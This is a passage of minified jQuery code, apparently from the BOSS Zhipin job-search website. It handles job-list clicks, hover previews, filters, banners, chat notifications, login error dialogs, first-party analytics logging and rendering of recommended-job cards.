        e.eq(n).addClass("cur"))
    }),
    $(".company-detail-grab .promotion-job ul").on("transitionEnd webkitTransitionEnd", function() {
        $(this).removeClass("left-out right-out")
    })),
    $(".link-recruit").on("click", function() {
        $(this).parent().find(".recruit-tip").fadeIn()
    }),
    $(".nav-figure").on("mouseover", function() {
        $(this).addClass("selected").find(".dropdown").show(),
        $(this).find(".recruit-tip").hide()
    }).on("mouseout", function() {
        $(this).removeClass("selected").find(".dropdown").hide(),
        $(this).find(".recruit-tip").hide()
    }),
    $(".nav-figure").hover(function() {
        var e = $(".nav-figure .vip-info .status");
        e.length && "升级VIP" == e.html() && $.ajax({
            type: "POST",
            url: "/wapi/zpCommon/actionLog/common.json",
            data: {
                ba: JSON.stringify({
                    action: "biz-item-exposure-SaleEntrance",
                    p: "100",
                    p2: "geek-vip-44"
                })
            },
            dataType: "JSON",
            success: function(e) {}
        })
    }, function() {}),
    $(".condition-insdustry .btn-all").on("click", function() {
        $(this).parent().toggleClass("show-all-insdustry")
    }),
    $(".condition-city .link-district").on("click", function() {
        $(".condition-district").addClass("show-condition-district"),
        $(".condition-area").removeClass("show-condition-area"),
        $(".condition-city .selected").removeClass("selected"),
        $(this).addClass("selected")
    }),
    $(".condition-city .link-area").on("click", function() {
        $(".condition-area").addClass("show-condition-area"),
        $(".condition-district").removeClass("show-condition-district"),
        $(".condition-city .selected").removeClass("selected"),
        $(this).addClass("selected")
    }),
    $(".siderbar-back-top").on("click", function() {
        $("html,body").animate({
            scrollTop: "0px"
        }, 400)
    }),
    ($(".home-box").length || $(".condition-box").length || $(".company-detail-grab")) && ($(".job-list").on("click", "li", function(e) {
        var t, i, n = $(this), a = n.find(".info-primary a"), o = a.attr("href"), s = $(".job-tab"), r = s.attr("data-keyword"), c = s.attr("data-l3code"), l = s.attr("data-filter"), d = s.attr("data-rescount"), p = s.attr("data-page"), u = a.attr("data-index"), h = a.attr("data-lid"), f = a.attr("data-itemid"), s = s.attr("data-lid"), m = a.attr("data-jobid");
        if (securityId = a.attr("data-securityid") || "",
        "A" != e.target.nodeName && !$(e.target).closest("a").length && 0 === $(e.target).parents(".detail-top-right").length && !$(e.target).hasClass("btn-startchat") && 0 === $(e.target).parents(".btn-startchat").length) {
            n.wrap('<form action="' + o + '" method="get" target="_blank"></form>'),
            n.append('<input type="hidden" name="ka" value="' + a.attr("ka") + '_blank" />'),
            n.append('<input type="hidden" name="lid" value="' + h + '" />'),
            n.append('<input type="hidden" name="securityId" value="' + securityId + '" />'),
            n.closest("form").submit();
            try {
                _T.sendEvent(a.attr("ka") + "_job")
            } catch (e) {}
            n.find('input[name="ka"]').remove(),
            n.find('input[name="lid"]').remove(),
            n.find('input[name="securityId"]').remove(),
            n.unwrap("form")
        }
        if ("A" == e.target.nodeName && -1 < e.target.href.indexOf("job_detail"))
            return o = e.target.getAttribute("href"),
            n = e.target.getAttribute("data-lid") || "",
            t = e.target.getAttribute("ka") || "",
            (i = $(e.target)).wrap('<form action="' + o + '" method="get" target="_blank"></form>'),
            i.append('<input type="hidden" name="ka" value="' + t + '_blank" />'),
            i.append('<input type="hidden" name="lid" value="' + n + '" />'),
            i.append('<input type="hidden" name="securityId" value="' + securityId + '" />'),
            i.closest("form").submit(),
            i.find('input[name="ka"]').remove(),
            i.find('input[name="lid"]').remove(),
            i.find('input[name="securityId"]').remove(),
            i.unwrap("form"),
            !1;
        o = {
            keyword: r,
            l3code: c,
            filter: l,
            rescount: d,
            page: p,
            index: u,
            lid: h,
            itemid: f,
            source: s,
            jobid: m
        };
        "A" == e.target.nodeName && 0 != $(e.target).parents(".company-text").length && (o = {
            keyword: r,
            l3code: c,
            filter: l,
            rescount: d,
            page: p,
            index: u,
            lid: h,
            itemid: 0,
            source: s,
            jobid: m,
            brand_id: a.attr("brand-id")
        }),
        $.ajax({
            type: "POST",
            url: "/wapi/zpCommon/actionLog/search.json",
            data: o,
            dataType: "json",
            success: function(e) {}
        })
    }),
    $(".job-list").on("click", ".company-item", function(e) {
        var t = $(this).parents(".job-list").find("li").first().find(".info-primary a")
          , i = (t.attr("href"),
        $(".job-tab"))
          , n = i.attr("data-keyword")
          , a = i.attr("data-l3code")
          , o = i.attr("data-filter")
          , s = i.attr("data-rescount")
          , r = i.attr("data-page")
          , c = t.attr("data-index")
          , l = t.attr("data-lid")
          , i = (t.attr("data-itemid"),
        i.attr("data-lid"));
        t.attr("data-jobid");
        $.ajax({
            type: "POST",
            url: "/wapi/zpCommon/actionLog/search.json",
            data: {
                keyword: n,
                l3code: a,
                filter: o,
                rescount: s,
                page: r,
                index: c,
                lid: l,
                itemid: 0,
                source: i
            },
            dataType: "json",
            success: function(e) {}
        })
    }),
    $(".job-list .info-primary .job-title").each(function(e) {
        var i = $(this)
          , n = i.parent().attr("data-jid")
          , a = i.parent().attr("data-lid")
          , o = ""
          , s = !1;
        (n || a) && i.hoverDelay({
            hoverDuring: 400,
            outDuring: 500,
            hoverEvent: function() {
                var e, t = document.documentElement.clientHeight - i.get(0).getBoundingClientRect().top;
                "" === i.find(".info-detail").text() ? $.ajax({
                    type: "GET",
                    url: "/wapi/zpgeek/view/job/card.json?jid=" + n + "&lid=" + a + "&type=3",
                    data: {},
                    dataType: "json",
                    success: function(e) {
                        e = e.zpData.html,
                        i.parent().find(".info-detail").html(e),
                        e = i.parent().find(".info-detail").height();
                        t < e + 18 && i.parent().find(".info-detail").css("top", -(e - t + 18) + "px"),
                        i.parent().addClass("cur"),
                        i.parent().find(".info-detail").hover(function() {
                            s = !0
                        }, function() {
                            i.parent().removeClass("cur"),
                            s = !1
                        }),
                        o = setTimeout(function() {
                            try {
                                _T.sendEvent("show_popjob_" + n)
                            } catch (e) {}
                        }, 1e3)
                    }
                }) : (e = i.parent().find(".info-detail").height(),
                t < e + 18 && i.parent().find(".info-detail").css("top", -(e - t + 18) + "px"),
                i.parent().addClass("cur"),
                o = setTimeout(function() {
                    try {
                        _T.sendEvent("show_popjob_" + n)
                    } catch (e) {}
                }, 1e3))
            },
            outEvent: function() {
                s || (clearTimeout(o),
                i.parent().removeClass("cur"),
                i.parent().find(".info-detail").css("top", 0))
            }
        })
    })),
    $(".info-primary").on("click", ".link-like", function(e) {
        e.preventDefault(),
        Detail.setInterest($(this))
    }),
    $(".info-primary").on("click", ".btn-startchat", function(e) {
        e.preventDefault()
    }),
    $(".filter-select-box .dropdown-select").each(function(e) {
        var t = $(this);
        t.hover(function(e) {
            t.parent().addClass("cur")
        }, function() {
            t.parent().removeClass("cur")
        })
    }),
    $(".now-city-pos .dropdown-wrap").each(function(e) {
        var t = $(this);
        t.hoverDelay({
            hoverDuring: 100,
            outDuring: 100,
            hoverEvent: function() {
                t.addClass("cur")
            },
            outEvent: function() {
                t.removeClass("cur")
            }
        })
    }),
    $(".search-box-scan").on("mouseenter", function() {
        try {
            _T.sendEvent("cpc_job_list_hover_scan")
        } catch (e) {}
    }),
    $(".column-search-panel").length && (g = $(".column-search-panel").height(),
    $(window).scroll(function() {
        I(),
        z()
    }),
    I(),
    z()),
    $(".search-box-scan").length && ($(".search-box-scan").parents(".search-panel-new").find(".search-box").addClass("is-login"),
    "overseas_recruit" == $("#page_key_name").val() && $(".search-box-scan").parents(".search-panel-new").find(".search-box").addClass("overseas-recruit")),
    $(".footer-scan").length && ($("#siderbar").css({
        bottom: "304px",
        transition: "all 0.2s"
    }),
    v = $("#footer"),
    w = $(".footer-scan"),
    b = $(".home-box .job-list"),
    y = $(window),
    b.css("margin-bottom", "105px"),
    L(),
    $(window).scroll(function() {
        L()
    }),
    w.find(".footer-scan-close").click(function() {
        w.fadeOut(300, function() {
            b.css({
                "margin-bottom": "15px",
                transition: "all 0.2s"
            }),
            $("#siderbar").css({
                bottom: "214px",
                transition: "all 0.2s"
            })
        })
    })),
    $(window).width() < 1348 && $(".footer-scan .btns").css("margin-right", "84px"),
    $(window).resize(function() {
        $(window).width() < 1348 ? $(".footer-scan .btns").css("margin-right", "84px") : $(".footer-scan .btns").css("margin-right", "0")
    }),
    setTimeout(function() {
        if (window._T) {
            var e = window.screen.width
              , t = window.screen.height
              , i = window.innerWidth
              , n = window.innerHeight;
            try {
                _T.sendTracking("screen_geek_" + e + "_" + t + "_avail_" + i + "_" + n),
                _T.sendEvent("screen_geek_" + e + "_" + t + "_avail_" + i + "_" + n)
            } catch (e) {}
        }
    }, 2e3),
    $("body").on("click", "#siderbar .siderbar-feedback", function() {
        Feedback.getContent()
    }),
    $("body").on("click", "#siderbar .siderbar-service", function() {
        if (!$(".chat-bot-iframe-mask").length) {
            try {
                _T.sendEvent("side_feedback")
            } catch (e) {}
            $("body").append('        <div class="chat-bot-iframe-mask">            <iframe                class="chat-bot-iframe"                src="/web/wisdomstone/index.html">            </iframe>        </div>'),
            window.addEventListener("message", function(e) {
                e && e.data && "closeChatBotDialog" === e.data.action && $(".chat-bot-iframe-mask").remove()
            })
        }
    }),
    $("#footer").on("click", ".footer-feedback", function() {
        Feedback.getContent()
    }),
    x = .5 <= Math.random() ? "(010)57596212，(010)65090445" : "(010)65090445，(010)57596212",
    $("#footer .copyright .renshe-phone").html("朝阳区人社局监督电话").one("click", function() {
        $(this).html("朝阳区人社局监督电话：" + x)
    }),
    D = $("#footer .icon-client-app"),
    _ = D.data("source") || 3,
    k = D.attr("href") || "",
    S = D.attr("ka") || "",
    C = -1 < k.indexOf("source="),
    -1 < k.indexOf("?") ? k += "&source=" + _ + "&ka=" + S : k += "?source=" + _ + "&ka=" + S,
    -1 < window.location.host.indexOf(".zhipin.com") && -1 == k.indexOf(".zhipin.com") && (k = "https://www.zhipin.com" + k),
    -1 < window.location.host.indexOf(".zhipin.com") && -1 == k.indexOf(".zhipin.com") && (k = "https://www.zhipin.com" + k),
    D.on("click", function(e) {
        C || (e.preventDefault(),
        window.open(k, "_blank"))
    }),
    $(".common-tab-box").on("click", "h3 span", function() {
        var e = $(this).index()
          , t = $(this).parents(".common-tab-box").first();
        $(this).parents("h3").first().find("span").removeClass("cur"),
        $(this).addClass("cur"),
        $(t).find("ul").removeClass("cur"),
        $(t).find("ul").eq(e).addClass("cur"),
        O($(t).find("ul").eq(e)),
        t.hasClass("job-tab-box") && (e = t.find(".cur li").first()).attr("data-url") && t.find(".common-tab-more a").attr("href", "/" + e.attr("data-url"))
    }),
    O($(".common-tab-box ul.cur")),
    $(".job-menu-school").not(".screen-menu").find("dl").each(function(e) {
        var t = $(this);
        t.hoverDelay({
            hoverDuring: 100,
            outDuring: 100,
            hoverEvent: function() {
                t.siblings().removeClass("cur"),
                t.addClass("cur")
            }
        })
    }),
    $(".screen-menu dl").each(function(e) {
        var t = $(this);
        t.hoverDelay({
            hoverDuring: 100,
            outDuring: 100,
            hoverEvent: function() {
                t.siblings().removeClass("cur"),
                t.addClass("cur"),
                _T.sendEvent("school_guide_hover_" + (e + 1))
            },
            outEvent: function() {
                t.removeClass("cur")
            }
        })
    }),
    $(".school-body").length,
    $(".school-banner .info-btn").each(function(e) {
        var t = $(this);
        t.hoverDelay({
            hoverDuring: 100,
            outDuring: 100,
            hoverEvent: function() {
                t.addClass("cur")
            },
            outEvent: function() {
                t.removeClass("cur")
            }
        })
    }),
    $(".school-typebox").length && $(".school-typebox").on("click", "div", function() {
        if ($(this).hasClass("cur"))
            return !1
    }),
    $(".nav-overseas-new").length && ($("#header").append('<div class="overseas-nav-box"><i class="ui-icon-close"></i><div class="close"></div><img src="https://res.zhipin.com/web/geek/resource/header-hi.png" alt=""><h4>海归专属，高薪职位</h4><a href="/returnee_jobs/" ka="homepage_go_ahead_to_overseas">去看看</a></div>'),
    T = $("#header .overseas-nav-box"),
    _ = $(".nav-overseas-new").attr("data-overseas-ip"),
    S = sessionStorage.getItem("overseas_close"),
    "true" == _ && "true" != S && 0 !== (D = T).length && D.css({
        left: $(".nav-overseas-new").offset().left - 20,
        display: "block"
    }),
    $(".overseas-nav-box .close").on("click", function(e) {
        var t;
        0 !== (t = T).length && t.css({
            display: "none"
        }),
        sessionStorage.setItem("overseas_close", !0),
        _T.sendEvent("homepage_close_bubble_to_overseas")
    }),
    $(window).resize(function() {
        0 < T.length && $(".nav-overseas-new").offset() && T.css({
            left: $(".nav-overseas-new").offset().left - 20
        })
    }))
}),
$(function() {
    FastSign("#home-search-login")
}),
$.ajax({
    type: "get",
    url: "/wapi/zpgeek/webtopbanner/query.json",
    success: function(e) {
        if (0 == e.code) {
            e = e.zpData;
            if (e.picUrl && e.resourceUrl) {
                e = '<div id="top-active-box" class="top-active-box" style="height:0; overflow:hidden;background-image: url(' + e.picUrl + '); background-color: #000;"><div class="active-close"></div><a class="banner-landing" target="_blank" href="' + e.resourceUrl + '"></a></div>',
                $(".home-body #header").before(e),
                $("#top-active-box").animate({
                    height: 120
                }, function() {
                    window.scrollTo(0, 0)
                }),
                $("#top-active-box").length && $("#siderbar").animate({
                    top: "169px"
                }),
                $(".banner-landing").on("click", function() {
                    try {
                        _T.sendEvent("web_home_banner_click", "1")
                    } catch (e) {}
                }),
                $(".active-close").on("click", function() {
                    $(".top-active-box").remove(),
                    $("#siderbar").css("top", "49px");
                    try {
                        _T.sendEvent("web_home_banner_click", "2")
                    } catch (e) {}
                });
                try {
                    _T.sendEvent("web_home_banner_expose")
                } catch (e) {}
            }
        }
    }
}),
!function() {
    var n, a, e, t, i = -1 < window.location.href.indexOf("/web/geek/chat");
    function o(e) {
        return e = e || 0 === e ? 1 : e,
        parseInt((new Date).valueOf() / e, 10)
    }
    "_PAGE"in window && _PAGE.ws && !isIE && !_PAGE.isGeekChat && (n = !1,
    a = null,
    e = [],
    t = "https://static.weizhipin.com/zhipin-geek/mqa",
    "pre-www.zhipin.com" == window.location.host ? t = "https://static.weizhipin.com/zhipin-geek/pre" : -1 < window.location.host.indexOf(".zhipin.com") && (t = "https://static.zhipin.com/v2"),
    e = "undefined" == typeof Paho ? ["https://img.bosszhipin.com/static/file/2021/mqtt-v2.1.min.js?from=geek&t=" + o(6e4), staticPath + "/web/geek/js/socket.js?t=" + o(6e4)] : [t + "/web/geek/js/socket.js?t=" + o(6e4)],
    EventBus.subscribe("MESSAGE_STATISTIVS", function(e) {
        i || (0 != e ? (99 < e && (e = "99+"),
        $(".nav-chat-num").show().text(e)) : $(".nav-chat-num").hide().text(""))
    }),
    EventBus.subscribe("MESSAGE_NOTICE", function(e) {
        if (n)
            if (e = e || {},
            !(-1 < window.location.href.indexOf("/web/geek/chat"))) {
                var t = ["https://img.bosszhipin.com/boss/avatar/avatar_1.png", "https://img.bosszhipin.com/boss/avatar/avatar_2.png", "https://img.bosszhipin.com/boss/avatar/avatar_3.png", "https://img.bosszhipin.com/boss/avatar/avatar_4.png", "https://img.bosszhipin.com/boss/avatar/avatar_5.png", "https://img.bosszhipin.com/boss/avatar/avatar_7.png"]
                  , t = t[parseInt(Math.random() * (t.length - 1))]
                  , i = "/web/geek/chat"
                  , i = (i = -1 < window.location.host.indexOf(".weizhipin.com") ? "https://boss-m-qa.weizhipin.com" + i : -1 < window.location.host.indexOf("pre-www.zhipin.com") ? "https://pre-www.zhipin.com" + i : "https://www.zhipin.com" + i,
                ['<div class="message-notice-toast">', '<a href="' + (i = e.encryptUniqueId ? i + "?encrptId=" + e.encryptUniqueId : i) + '" ka="message_notify_click" target="_blank">', '<div class="avatar"><img src="' + (e.avatar || t) + '" /></div>', '<div class="toast-notice-main"><div class="chat-user-info"><b class="name">' + (e.name || "") + '</b></div><p class="message-desc">' + (e.text || "") + "</p></div>", "</a></div>"].join(""));
                clearTimeout(a),
                $("body > .message-notice-toast").length && $("body > .message-notice-toast").remove(),
                $(i).appendTo("body");
                try {
                    _T.sendEvent("message_notify_expose")
                } catch (e) {}
                a = setTimeout(function() {
                    $("body > .message-notice-toast").remove(),
                    clearTimeout(a)
                }, 5e3)
            }
    }),
    seriesLoadScripts(e, function() {}),
    $.ajax({
        type: "get",
        url: "/wapi/zpchat/notify/setting/get",
        success: function(e) {
            var i = !1;
            0 == e.code && e.zpData && (e.zpData.userNotifySettingList || []).length && $.each(e.zpData.userNotifySettingList, function(e, t) {
                113 == t.notifyType && 4 == t.settingType && (i = !0)
            }),
            n = i
        }
    }))
}(),
!function() {
    if ($("body").hasClass("wechat-login-tip"))
        try {
            !function e() {
                if (void 0 === UserCheck)
                    setTimeout(e, 500);
                else if ("undefined" != typeof _ERROR_FOR_WECHAT && _ERROR_FOR_WECHAT && _ERROR_FOR_WECHAT.isWechat)
                    UserCheck.checkPhone("/wapi/zppassport/login/phone", "/wapi/zppassport/send/smsCode", _ERROR_FOR_WECHAT.phone, _ERROR_FOR_WECHAT.regionCode, null, {
                        closeLayer: !1,
                        closeText: !1,
                        isWxLogin: !0
                    });
                else if ("undefined" != typeof _ERROR_TYPE && _ERROR_TYPE && _ERROR_TYPE.resCode) {
                    $(".page-sign").on("click", ".close", function() {
                        window.location.href = jumpUrl
                    }),
                    -1 < [4563, 4567, 4912, 4918, 4930].indexOf(_ERROR_TYPE.resCode) || 4942 <= _ERROR_TYPE.resCode && _ERROR_TYPE.resCode <= 4950 ? Sign.loginLimitTip(_ERROR_TYPE.resCode, {
                        closeCallback: function() {
                            window.location.href = jumpUrl
                        }
                    }) : $.dialog({
                        title: "登录失败",
                        content: _ERROR_TYPE.resMsg,
                        confirmText: "知道了",
                        cancelText: !1,
                        wrapClass: "dialog-prop-default dialog-error-tip",
                        lock: !0,
                        closeLayer: !1,
                        closeText: !1,
                        onConfirm: function(e) {
                            window.location.href = jumpUrl
                        }
                    });
                    try {
                        _T.sendEvent("address_diff")
                    } catch (e) {}
                } else
                    window.location.href = jumpUrl
            }()
        } catch (e) {
            window.location.href = jumpUrl
        }
}(),
!function() {
    var l = {
        $hotBox: $(".home-box .merge-city-job"),
        $recommendBox: $(".home-box .merge-city-job-recommend .common-tab-more"),
        $container: $(".home-box .merge-city-job-recommend"),
        exceptId: "",
        activeTabid: 1,
        firstLoad: !0,
        recommendData1: [],
        recommendData2: [],
        recommendData3: [],
        hoverTimer: null,
        iconCollect: [{
            iconFlag: 1,
            iconName: "急聘",
            iconClass: "name-icon-blue"
        }, {
            iconFlag: 2,
            iconUrl: "https://img.bosszhipin.com/static/file/2022/ehny3onx7g1662102884807.png",
            alt: "代招"
        }, {
            iconFlag: 3,
            iconUrl: "https://img.bosszhipin.com/static/file/2022/e8lxztduuf1662102884935.png",
            alt: "派遣"
        }, {
            iconFlag: 4,
            iconName: "外地",
            iconClass: ""
        }, {
            iconFlag: 8,
            iconUrl: "https://img.bosszhipin.com/static/file/2022/g7mukaiuv51662102884278.png",
            alt: "猎头"
        }, {
            iconFlag: 9,
            iconUrl: "https://img.bosszhipin.com/static/file/2022/r17uyyvba41662102884867.png",
            alt: "优选"
        }, {
            iconFlag: 13,
            iconUrl: "https://img.bosszhipin.com/static/file/2022/cf559kvqr01662102884687.png",
            alt: "外包"
        }, {
            iconFlag: 17,
            iconUrl: "https://img.bosszhipin.com/static/file/2022/k843x3vmus1662101251477.png",
            alt: "校招国企"
        }],
        init: function() {
            var e;
            this.renderCodeDiv(),
            this.$recommendBox[0] && (e = [$('<ul class="sub-ul-box sub-ul-0"></ul>').css({
                display: "none",
                "min-height": "40px",
                width: "104%"
            }), $('<ul class="sub-ul-box sub-ul-1"></ul>').css({
                display: "none",
                "min-height": "40px",
                width: "104%"
            }), $('<ul class="sub-ul-box sub-ul-2"></ul>').css({
                display: "none",
                "min-height": "40px",
                width: "104%"
            })],
            this.$recommendBox.before(e),
            this.getRecommendInfo()),
            this.initEvent()
        },
        initEvent: function() {
            var n = this;
            (window._PAGE || {}).uid ? ($(document).on("mouseenter", "#main .guide-app-download-icon", function() {
                var t = $(this)
                  , e = $(this)[0].getBoundingClientRect().left
                  , i = $(this)[0].getBoundingClientRect().top;
                document.querySelector(".guide-download-app-v62").style.display = "block",
                document.querySelector(".guide-download-app-v62").style.top = i - 20 + "px",
                document.querySelector(".guide-download-app-v62").style.left = e + 24 + "px",
                n.hoverTimer && clearTimeout(n.hoverTimer),
                n.hoverTimer = setTimeout(function() {
                    try {
                        var e = ""
                          , e = t.parent().parent().parent().parent().data("data") ? t.parent().parent().parent().parent().data("data").encryptJobId : t.parent().parent().attr("href").split("/job_detail/")[1].split(".html")[0];
                        _T.sendEvent("sanwu_downloadapp", "0", e)
                    } catch (e) {}
                }, 2e3)
            }),
            $(document).on("mouseleave", "#main .guide-app-download-icon", function() {
                document.querySelector(".guide-download-app-v62").style.display = "none"
            })) : $(document).on("click", "#main .guide-app-download-icon", function(e) {
                e.preventDefault();
                try {
                    _T.sendEvent("cpc_job_index_chat")
                } catch (e) {}
                ShowLoginDialog.showBossLogin({
                    params: {
                        pk: $(this).closest("a").attr("ka") || "",
                        eventLog: {
                            p: "cpc_job_index_chat"
                        }
                    }
                })
            }),
            $(document).on("click", ".merge-city-job-recommend h3>span", function(e) {
                e.stoppropagation,
                n.activeTabid = +$(this).index() + 1,
                n.$container.find(".sub-ul-box").hide(),
                n.$container.find(".sub-ul-" + $(this).index()).show()
            }),
            $(document).on("click", ".home-box .merge-city-job-recommend .common-tab-more a", function(e) {
                e.stoppropagation();
                try {
                    _T.sendEvent("detail_boss_more")
                } catch (e) {}
            })
        },
        renderCodeDiv: function() {
            $(".guide-download-app-v62")[0] || $(document.body).append('<div class="guide-download-app-v62" style="display:none"><div class="app-icon-arrow"></div><div class="app-icon-v62"></div><div class="app-icon-des-v62">一键扫码  随时沟通</div></div>')
        },
        renderRecommend1: function(e, t) {
            this.$container.find(".sub-ul-0").empty();
            for (var i = 0; i < e.length; i++)
                this.$container.find(".sub-ul-0").append(this.renderCard1(e[i], i, t))
        },
        renderRecommend2: function(e, t) {
            this.$container.find(".sub-ul-1").empty();
            for (var i = 0; i < e.length; i++)
                this.$container.find(".sub-ul-1").append(this.renderCard2(e[i], i, t))
        },
        renderRecommend3: function(e, t) {
            this.$container.find(".sub-ul-2").empty();
            for (var i = 0; i < e.length; i++)
                this.$container.find(".sub-ul-2").append(this.renderCard3(e[i], i, t))
        },
        isShowRecommendBox: function() {
            this.$container.find("h3>span").hide(),
            this.$container.find(".sub-ul-box").hide(),
            0 < this.recommendData1.length && (this.$container.show(),
            this.$container.find("h3>span").eq(0).show()),
            0 < this.recommendData2.length && (this.$container.show(),
            this.$container.find("h3>span").eq(1).show()),
            0 < this.recommendData3.length && (this.$container.show(),
            this.$container.find("h3>span").eq(2).show()),
            this.$container.find("h3 > span:visible").eq(0).trigger("click")
        },
        renderCard1: function(e, t, i) {
            var n = ""
              , a = (e.cityName && (n = e.cityName),
            e.areaDistrict && (n = n ? n + "·" + e.areaDistrict : e.areaDistrict),
            e.businessDistrict && (n = n ? n + "·" + e.businessDistrict : e.businessDistrict),
            "")
              , o = ((a = e.jobLabels[1] ? e.jobLabels[1] : a) && e.jobLabels[2] && (a = a + '<span class="vline"></span>' + e.jobLabels[2]),
            "")
              , s = ($.each(e.iconFlagList || [], function(e, i) {
                $.each(l.iconCollect, function(e, t) {
                    t.iconFlag == i && t.iconUrl && (o += '<img class="job-daizhao-icon" src="' + t.iconUrl + '" alt=" ' + t.alt + ' " />')
                })
            }),
            "")
              , r = (e.atsDirectPost || (s = '<div class="guide-app-download-icon"></div>'),
            $("#page_key_name").val() || "");
            return (0 < e.anonymous ? $('<li><div class="sub-li"><a href="/job_detail/' + e.encryptJobId + ".html?pk=" + r + "&ka=rcmd_list_job_" + (+t + 1) + "_blank&lid=" + e.lid + "&sessionId=" + i + '" ka="rcmd_list_job_' + t + '" class="job-info" target="_blank"><div class="sub-li-top"><p class="name">' + (filterXss(e.jobName) || "") + "</p>" + o + s + '<p class="salary">' + (e.salaryDesc || "") + '</p></div><p class="job-text"><span>' + a + '</span></p></a><div class="sub-li-bottom"><a href="javascript:;"  class="user-info"><p><img src="' + filterXss(e.brandLogo) + '"><span class="name">' + (filterXss(e.brandName) || "") + '</span></p><div class="sub-li-bottom-commany-place"><i class="job-card-location"></i><span class="name">' + n + "</span></div></div></a></div></li>") : $('<li><div class="sub-li"><a href="/job_detail/' + e.encryptJobId + ".html?pk=" + r + "&ka=rcmd_list_job_" + (+t + 1) + "_blank&lid=" + e.lid + "&sessionId=" + i + '" ka="rcmd_list_job_' + t + '" class="job-info" target="_blank"><div class="sub-li-top"><p class="name">' + (filterXss(e.jobName) || "") + "</p>" + o + s + '<p class="salary">' + (e.salaryDesc || "") + '</p></div><p class="job-text"><span>' + a + '</span></p></a><div class="sub-li-bottom"><a href="/gongsi/' + (e.encryptBrandId || "") + ".html?ka=rcmd_list_company_" + (+t + 1) + '" ka="rcmd_list_company_' + t + '"  class="user-info" target="_blank"><p><img src="' + filterXss(e.brandLogo) + '"><span class="name">' + (filterXss(e.brandName) || "") + '</span></p><div class="sub-li-bottom-commany-place"><i class="job-card-location"></i><span class="name">' + n + "</span></div></div></a></div></li>")).data("data", e)
        },
        renderCard2: function(e, t, i) {
            var n = ""
              , a = (e.cityName && (n = e.cityName),
            e.areaDistrict && (n = n ? n + "·" + e.areaDistrict : e.areaDistrict),
            e.businessDistrict && (n = n ? n + "·" + e.businessDistrict : e.businessDistrict),
            "")
              , o = ((a = e.jobLabels[1] ? e.jobLabels[1] : a) && e.jobLabels[2] && (a = a + '<span class="vline"></span>' + e.jobLabels[2]),
            $("#page_key_name").val() || "")
              , s = ""
              , r = ($.each(e.iconFlagList || [], function(e, i) {
                $.each(l.iconCollect, function(e, t) {
                    t.iconFlag == i && t.iconUrl && (s += '<img class="job-daizhao-icon" src="' + t.iconUrl + '" alt=" ' + t.alt + ' " />')
                })
            }),
            "");
            return e.atsDirectPost || (r = '<div class="guide-app-download-icon"></div>'),
            (0 < e.anonymous ? $('<li><div class="sub-li"><a href="/job_detail/' + e.encryptJobId + ".html?pk=" + o + "&ka=new_list_job_" + (+t + 1) + "_blank&lid=" + e.lid + "&sessionId=" + i + '" ka="new_list_job_' + t + '" class="job-info" target="_blank"><div class="sub-li-top"><p class="name">' + (filterXss(e.jobName) || "") + "</p>" + s + r + '<p class="salary">' + (e.salaryDesc || "") + '</p></div><p class="job-text"><span>' + a + '</span></p></a><div class="sub-li-bottom"><a href="javascript:;" ka="new_list_company_' + t + '" class="user-info"><p><img src="' + filterXss(e.brandLogo) + '"><span class="name">' + (filterXss(e.brandName) || "") + '</span></p><div class="sub-li-bottom-commany-place"><i class="job-card-location"></i><span class="name">' + n + "</span></div></div></a></div></li>") : $('<li><div class="sub-li"><a href="/job_detail/' + e.encryptJobId + ".html?pk=" + o + "&ka=new_list_job_" + (+t + 1) + "_blank&lid=" + e.lid + "&sessionId=" + i + '" ka="new_list_job_' + t + '" class="job-info" target="_blank"><div class="sub-li-top"><p class="name">' + (filterXss(e.jobName) || "") + "</p>" + s + r + '<p class="salary">' + (e.salaryDesc || "") + '</p></div><p class="job-text"><span>' + a + '</span></p></a><div class="sub-li-bottom"><a href="/gongsi/' + (e.encryptBrandId || "") + ".html?ka=new_list_company_" + (+t + 1) + '" ka="new_list_company_' + t + '" class="user-info" target="_blank"><p><img src="' + filterXss(e.brandLogo) + '"><span class="name">' + (filterXss(e.brandName) || "") + '</span></p><div class="sub-li-bottom-commany-place"><i class="job-card-location"></i><span class="name">' + n + "</span></div></div></a></div></li>")).data("data", e)
        },
        renderCard3: function(e, t, i) {
            var n = ""
              , a = (e.cityName && (n = e.cityName),
            e.areaDistrict && (n = n ? n + "·" + e.areaDistrict : e.areaDistrict),
            e.businessDistrict && (n = n ? n + "·" + e.businessDistrict : e.businessDistrict),
            "")
              , o = ((a = e.jobLabels[1] ? e.jobLabels[1] : a) && e.jobLabels[2] && (a = a + '<span class="vline"></span>' + e.jobLabels[2]),
            $("#page_key_name").val() || "")
              , s = ""
              , r = ""
              , c = ($.each(e.iconFlagList || [], function(e, i) {
                $.each(l.iconCollect, function(e, t) {
                    t.iconFlag == i && t.iconUrl ? r += '<img class="job-daizhao-icon" src="' + t.iconUrl + '" alt=" ' + t.alt + ' " />' : t.iconFlag == i && t.iconName && (s += '<div class="name-after-icon ' + (t.iconClass || "") + '">' + t.iconName + "</div>")
                })
            }),
            "");
            return e.atsDirectPost || (c = '<div class="guide-app-download-icon"></div>'),
            (0 < e.anonymous ? $('<li><div class="sub-li"><a href="/job_detail/' + e.encryptJobId + ".html?pk=" + o + "&ka=new_list_job_" + (+t + 1) + "_blank&lid=" + e.lid + "&sessionId=" + i + '" ka="new_list_job_' + t + '" class="job-info" target="_blank"><div class="sub-li-top"><p class="name">' + (filterXss(e.jobName) || "") + "</p>" + r + s + c + '<p class="salary">' + (e.salaryDesc || "") + '</p></div><p class="job-text"><span>' + a + '</span></p></a><div class="sub-li-bottom"><a href="javascript:;" ka="new_list_company_' + t + '" class="user-info"><p><img src="' + filterXss(e.brandLogo) + '"><span class="name">' + (filterXss(e.brandName) || "") + '</span></p><div class="sub-li-bottom-commany-place"><i class="job-card-location"></i><span class="name">' + n + "</span></div></div></a></div></li>") : $('<li><div class="sub-li"><a href="/job_detail/' + e.encryptJobId + ".html?pk=" + o + "&ka=new_list_job_" + (+t + 1) + "_blank&lid=" + e.lid + "&sessionId=" + i + '" ka="new_list_job_' + t + '" class="job-info" target="_blank"><div class="sub-li-top"><p class="name">' + (filterXss(e.jobName) || "") + "</p>" + r + s + c + '<p class="salary">' + (e.salaryDesc || "") + '</p></div><p class="job-text"><span>' + a + '</span></p></a><div class="sub-li-bottom"><a href="/gongsi/' + (e.encryptBrandId || "") + ".html?ka=new_list_company_" + (+t + 1) + '" ka="new_list_company_' + t + '" class="user-info" target="_blank"><p><img src="' + filterXss(e.brandLogo) + '"><span class="name">' + (filterXss(e.brandName) || "") + '</span></p><div class="sub-li-bottom-commany-place"><i class="job-card-location"></i><span class="name">' + n + 